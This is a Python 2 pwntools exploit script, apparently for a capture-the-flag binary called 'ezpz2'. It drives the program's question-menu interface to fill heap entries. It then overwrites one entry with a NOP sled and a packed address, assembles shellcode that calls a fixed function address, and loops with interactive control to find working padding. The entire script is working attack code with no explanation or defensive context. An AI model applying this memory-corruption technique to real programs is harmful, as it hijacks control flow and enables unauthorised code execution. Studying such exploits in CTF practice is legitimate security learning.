#python2

import string
import json

from pwn import *

NAME = "./ezpz2"
context.binary = NAME

# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""

def io_beg(): return process(NAME)

def header(s, len=20):
	print("="*len +s+"="*len)


def io_rdy(io):
	io.recvuntil("[Q]uit")
	#print("Ready")

def io_q(io):
	io.sendline("q")
	
def io_c(io):
	io.sendline("c")
	io.recvuntil("Created new question. ID")
	buf = io.recvline().strip()
	io_rdy(io)
	return int(buf)
	
def io_d(io, id):
	io.sendline("d")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io_rdy(io)

def io_s(io, id, s):
	#print("filling "+str(id)+" with "+s)
	io.sendline("S")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io.recv(timeout=1)
	io.sendline(s)
	return 0

def io_a(io, id):
	io.sendline("a")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io.recvuntil("I have the answer perhaps: '")
	buf = io.recvuntil("'")
	io_rdy(io)
	return buf

# inclusive
def io_all(io, min, max):
	buf = {}
	for i in range(max-min+1):
		k = i+min
		current = {str(k).zfill(3): io_a(io, k)}
		
		buf.update(current)
	
	j = json.dumps(buf, indent = 2, sort_keys=True)
	return j

def io_fill(io, n):
	#header("Fill 1")
	for i in range(n):
		io_c(io)
	
	
	#header("Fill 2")
	maxlen = 23 #fgets, 24 - 1
	c = cyclic(length=None, alphabet="0123456789BEF")
	for i in range(n):
		io_s(io, i, c[maxlen*i:(maxlen*(i+1))])
		
	#header("Fill 3")
	buf = io_all(io, 0, n-1)
	
	#header("Fill fin")
	#print(buf)

def io_isCrash(io):
	buf = io.poll(False)
	
	if(buf == None):
		io_q(io)
		return 0
	elif(buf != 0):
		return 1
	else:
		return 0
	
header("P0")

# main	08048B3D	
main = 0x08048B3D
#banner	0804B060	
banner = 0x0804B060

shell = """push 0x08048A5C
pop eax
call eax
ret
nop
"""
shell = asm(shell)

target = 4

fin = 0
padding = 80
while(fin == 0):
	io = io_beg()
	io_rdy(io)
	io_fill(io,20)

	io_s(io,target, "\x90"*56 + str(p32(banner)))
	
	try:
		io_a(io,target+1)
	except Exception, e:
		pass
	
	print("padding: "+str(padding))
	io.interactive()
	
	if(io_isCrash(io) == 0):
		fin = 1
	else:
		padding=padding-1
		io.close()
		
print("FIN")

"""
io_d(io, 10)
print(io_all(io, 0,9))
print(io_all(io, 11,19))
"""

io.interactive()
